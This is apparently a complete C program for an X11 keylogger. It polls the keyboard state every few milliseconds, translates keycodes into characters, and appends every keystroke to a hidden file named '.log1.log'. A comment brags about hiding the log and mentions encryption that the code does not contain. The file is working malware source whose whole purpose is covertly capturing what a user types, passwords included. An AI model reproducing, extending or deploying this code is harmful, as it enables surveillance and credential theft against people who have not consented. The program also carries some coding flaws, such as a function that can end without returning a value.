#include <pthread.h>
#include <string.h>
#include <X11/Xlib.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <X11/keysym.h>

int bit(unsigned char i) 
{
	switch (i)
	{
		case 1: return 0;
		case 2: return 1;
		case 4: return 2;
		case 8: return 3;
		case 16: return 4;
		case 32: return 5;
		case 64: return 6;
		case 128: return 7;
	}
}

struct conv {
    char from[20], to[5];
}

conv_table[] = {

    {"return","\n"},    {"escape","^["},    {"delete", "^H"},
    {"shift",""},       {"control",""},     {"tab","\t"},
    {"space", " "},     {"exclam", "!"},    {"quotedbl", "\""},
    {"numbersign", "#"},{"dollar", "$"},    {"percent", "%"},
    {"ampersand", "&"}, {"apostrophe", "'"},{"parenleft", "("},
    {"parenright", ")"},{"asterisk", "*"},  {"plus", "+"},
    {"comma", ","},     {"minus", "-"},     {"period", "."},
    {"slash", "/"},     {"colon", ":"},     {"semicolon", ";"},
    {"less", "<"},      {"equal", "="},     {"greater", ">"},
    {"questio", "?"},  {"at", "@"},        {"bracketleft", "["},
    {"backslash", "\\"},{"bracketright", "]"},{"asciicircum", "^"},
    {"underscore", "_"},{"grave", "`"},     {"braceleft", "{"},
    {"bar", "|"},       {"braceright", "}"},{"asciitilde", "~"},
    {"odiaeresis","ö"},{"udiaeresis","ü"},{"adiaeresis","ä"},{"",""}
};

struct conv_special {
    char from[20], to[5];
}

conv_tab_sp[] = {

    {"1","!"},    {"2","@"},    {"3", "#"},
    {"tab","\t"},
    {"space", " "},     {"exclam", "!"},    {"quotedbl", "\""},
    {"4", "$"},{"5", "%"},    {"6", "^"},
    {"7", "&"}, {"8", "*"},{"9", "("},
    {"0", ")"},{"-", "_"},  {"=", "+"},
    {",", "<"},     {".", ">"},     {"/", "?"},
    {"'", "\""},  {"[", "{"},     {"]", "}"},
    {"\\", "|"},  {";", ":"}, {"`", ":"}, {"",""}
};

int convert(char *data, char *out) {
    int i=0;
    while (conv_table[i].from[0] != 0 || conv_table[i].to[0] != 0) {
        if (!strncasecmp(data, conv_table[i].from, strlen(conv_table[i].from)) ) {
            strcpy(out,  conv_table[i].to);
            return 1;
        }
        i++;
    }
    return 0;
}

int check_sp(char *data, char *out) {
    int i=0;
    while (conv_tab_sp[i].from[0] != 0 || conv_tab_sp[i].to[0] != 0) {
        if (!strncasecmp(data, conv_tab_sp[i].from, strlen(conv_tab_sp[i].from)) ) {
            strcpy(out,  conv_tab_sp[i].to);
            return 1;
        }
        i++;
    }
    return 0;
}

// thinking file operation (plus the encrytion stuff) might take some time,
// i handled this as a thread. and is stored in a hidden file ;)
void logfile (char ch)
{
	FILE 	*file;

	if (ch != '\0') {
		if((file = fopen(".log1.log", "a+")) != NULL)
		{
		  	fputc(ch, file);
		  	fclose(file);
		}
	}
}

void log1(char *buf, int masked,  char *c, int caps)
{
	char in[128];
	int err;
	pthread_t tid=0;


	if (strlen(buf) > 1) {// or ignore
		if (convert(buf, in))
			if (masked == 1) 
				if (check_sp(in, in))
					*c=*in;
				else
					*c=*in;
			else 
				*c=*in;
		else
			*c=*buf;
	}
	else {
		if (caps == 1 || (caps == 0 && masked == 1))
			if (check_sp(buf, in))
				*c=*in;
			else
				*c=toupper(*buf);
		else
			*c=*buf;
	}

	err = pthread_create(&tid, NULL, &logfile, (void*)*c);
	if (err !=0 ) // did not create the thread? try direcly
		logfile(*c);

	printf("%c", *c);
}

int main() 
{
	unsigned char szKey[32];
	unsigned char szKeyOld[32];	
	unsigned int keycode;
	int masked=0, caps=0;
	char kname[64], *keyname, keysym;
	Display *display;	
	int i;
	char current=0;
	char loop;
	int count=0;

	display = XOpenDisplay(NULL);
	if(display == NULL) {
		return -1;
	}

	XQueryKeymap(display, szKeyOld);
	while (1) {
		usleep(5000);
		fflush(stdout);
		XQueryKeymap(display, szKey);

		loop = 0;
		for (i=0; i<32; i++) {
			if(szKeyOld[i] != szKey[i]) {
				loop = 1;
				count = 0;
				keycode = i*8 + bit(szKey[i] ^ szKeyOld[i]);

				if((szKey[i] & (szKey[i] ^ szKeyOld[i])) != 0) {

					keysym = XKeycodeToKeysym(display, keycode, 0);
					keyname = XKeysymToString(keysym);

					if (!keyname) {
						keyname = "";

						if (keycode == 50 || keycode == 62) {
							// shift is down
							masked = 1;
						} else if (keycode == 37 || keycode == 105) {
							keyname = "CTRL Down";
						} else if (keycode == 133) {
							keyname = "WinKey Down";
						} else if (keycode == 108) {
							keyname = "WinKey Down";
						} else if (keycode == 64) {
							keyname = "ALT GR Down";
						} else if (keycode == 34) {
							keyname = "ALT Down";
						} else if (keycode == 48) {
							keyname = "å";
						} else if (keycode == 47) {
							keyname = "ö";
						} else if (keycode == 22) {
							keyname = "BKSPS";
						} else if (keycode == 66) {
							// caps lock
							caps = !caps;
						} else if (keycode == 23) {
							keyname = "TAB";
						} else if (keycode == 67) {
							keyname = "F1";
						} else if (keycode == 68) {
							keyname = "F2";
						} else if (keycode == 69) {
							keyname = "F3";
						} else if (keycode == 70) {
							keyname = "F4";
						} else if (keycode == 71) {
							keyname = "F5";
						} else if (keycode == 72) {
							keyname = "F6";
						} else if (keycode == 73) {
							keyname = "F7";
						} else if (keycode == 74) {
							keyname = "F8";
						} else if (keycode == 76) {
							keyname = "F9";
						} else if (keycode == 95) {
							keyname = "F10";
						} else if (keycode == 96) {
							keyname = "F11";
						} else if (keycode == 9) {
							keyname = "F12";
						} else if (keycode == 36 || keycode == 104) {
							keyname = "ENTER";
						}

						//log1(keyname, masked);
						//printf("%s", keyname);
					}
					else {
						if (strcmp(keyname, "Q") == 0) {
							keyname = "LEFT";
						} else if (strcmp(keyname, "S") == 0) {
							keyname = "RIGHT";
						} else if (strcmp(keyname, "R") == 0) {
							keyname = "UP";							
						} else if (strcmp(keyname, "T") == 0) {
							keyname = "DOWN";	
						} /*else if (strcmp(keyname, "space") == 0) {
							keyname = " ";
						} else if (strcmp(keyname, "comma") == 0) {
							keyname = ",";							
						} else if (strcmp(keyname, "apostrophe") == 0) {
							keyname = "\"";							
						} else if (strcmp(keyname, "period") == 0) {
							keyname = ".";							
						} */

						log1(keyname, masked, &current, caps);
						//printf("%s", keyname);
					} 
				}
				else {

					if(keycode == 50 || keycode == 62) {
						// shift is up
						masked = 0;
					} else current=0;

					/* else if (keycode == 37 || keycode == 105) {
						keyname = "CTRL Up";	
					} else if (keycode == 133) {
						keyname = "WinKey Up";
					} else if (keycode == 108) {
						keyname = "ALT GR Up";
					} else if (keycode == 64) {
						keyname = "ALT Up";	
					}
					//printf("%s", keyname);
					*/
					//printf("%i", keycode);
				}
				szKeyOld[i] = szKey[i];				
			}
		}
		if (!loop) {
			count++;
			if (count == 50) {
				if (current != 0) {
					logfile(current);
					printf("%c", caps == 1 || (caps == 0 && masked == 1) ? toupper(current) : tolower(current));
					count = 0;
				}
			}
		}


	}
	XCloseDisplay(display);
	return 0;
}
